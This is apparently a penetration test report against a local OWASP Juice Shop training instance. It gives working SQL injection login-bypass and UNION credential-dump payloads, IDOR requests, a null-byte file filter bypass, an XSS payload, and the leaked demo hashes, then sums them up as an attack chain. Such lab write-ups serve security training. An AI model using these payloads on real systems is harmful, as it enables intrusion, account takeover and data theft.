# OWASP Juice Shop — Penetration Test Report

Target: http://127.0.0.1:3000/#/

## Vulnerabilities Exploited (with proof)

### 1. [CRITICAL] SQL Injection — Authentication Bypass
- Endpoint: POST /rest/user/login
- Payload: `email=' OR 1=1--`, password=anything
- Proof: Server returned admin JWT for admin@juice-sh.op (role=admin, id=1). Token decoded shows `"role":"admin"`, `"email":"admin@juice-sh.op"`, MD5 pw hash `6b5e7fab1c26eb98ced96aa5f7cae5d7`.
- Server-marked challenge solved: `loginAdminChallenge`.

### 2. [HIGH] UNION-based SQL Injection — Credential Exfiltration
- Endpoint: GET /rest/products/search?q=`)) UNION SELECT id,email,password,role,NULL,NULL,createdAt,updatedAt,deletedAt FROM Users--`
- Proof: Returned all 22 user rows merged with products. Example leaked rows:
  - admin@juice-sh.op / 6b5e7fab1c26eb98ced96aa5f7cae5d7 / admin
  - jim@juice-sh.op / e541ca7ecf72b8d1286474fc613e5e45 / customer
  - bender@juice-sh.op / 0c36e517e3fa95aabf1bbffc6744a4ef / customer
  - bjoern.kimminich@gmail.com / 6edd9d726cbdc873c539e41ae8757b8c / admin
  - ciso@juice-sh.op / 861917d5fa5f1172f931dc700d81a8fb / deluxe
- Challenge solved: `unionSqlInjectionChallenge`.

### 3. [HIGH] IDOR — /api/Users full dump
- Endpoint: GET /api/Users (with admin Bearer token)
- Proof: 22 users returned with email, MD5 password, role, security data. 8 admin accounts identified:

### 4. [HIGH] IDOR — Other users' Baskets

- Proof: Retrieved baskets belonging to UserIds 1,2,3,11,16 including products and prices.
- Challenge solved: `basketAccessChallenge`.

### 6. [HIGH] Directory Listing — /ftp exposed
- Endpoint: GET /ftp (Disallowed in robots.txt but enumerable)
- Proof — files listed: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, order_5267-098e8fc8c043da27.pdf, package-lock.json.bak, package.json.bak, suspicious_errors.yml, plus /ftp/quarantine.
- Challenge solved: `directoryListingChallenge`.

### 7. [HIGH] Poison Null Byte — FTP file type filter bypass
- Technique: GET /ftp/<file>.md%2500.pdf (URL-encoded null byte + allowed extension) bypassed .md/.bak filter.
- Extracted content:
  - acquisitions.md → "# Planned Acquisitions — This document is confidential! Do not distribute!" (confidential M&A info)
  - package.json.bak → juice-shop v6.2.0-SNAPSHOT with full author / contributor listing
  - coupons_2013.md.bak → XOR-obfuscated coupon codes (e.g. `n<MibgC7sn`, `mNYS#gC7sn`, …)
  - suspicious_errors.yml → Sigma detection rules
  - incident-support.kdbx → raw KeePass database bytes
  - announcement_encrypted.md → encrypted RSA ciphertext block
- Challenges solved: `forgottenBackupChallenge`, `forgottenDevBackupChallenge`, `nullByteChallenge`, `misplacedSignatureFileChallenge`.

### 8. [HIGH] Directory Listing — /encryptionkeys/ and /support/logs/ exposed
- Both returned HTML directory index pages.

### 9. [HIGH] Reflected / DOM XSS — Search
- Endpoint: http://127.0.0.1:3000/#/search?q=<iframe src="javascript:alert('XSS')">
- Proof: 16 consecutive `alert` dialogs fired and were auto-dismissed (see browser_state `Auto-closed JavaScript dialogs: [alert] XSS` × 16).
- Challenge solved: `localXssChallenge`.

## Attack Chain Summary
1. SQLi on /rest/user/login → admin JWT.
2. Store JWT in localStorage → bypass all frontend auth.
3. IDOR /api/Users → 22 users + MD5 hashes (crackable: admin=admin123 typical).
4. UNION SQLi /rest/products/search → second credential dump path.
5. /ftp + poison null byte → exfiltrate confidential M&A memo, KeePass DB, coupon secrets.
6. Admin API (/api/Cards, /api/Addresss, /rest/admin/application-configuration) → PII & payment data.
7. Basket IDOR → other customers' orders.
8. Reflected XSS on /#/search → arbitrary JS execution (alert fired).
9. Directory listings on /ftp, /encryptionkeys/, /support/logs/ → further sensitive material.

Total impact: Full administrative takeover, complete customer PII + credit card exposure, confidential corporate documents leaked, XSS for session hijacking, and encryption key material exposed — effectively complete compromise of the Juice Shop instance.
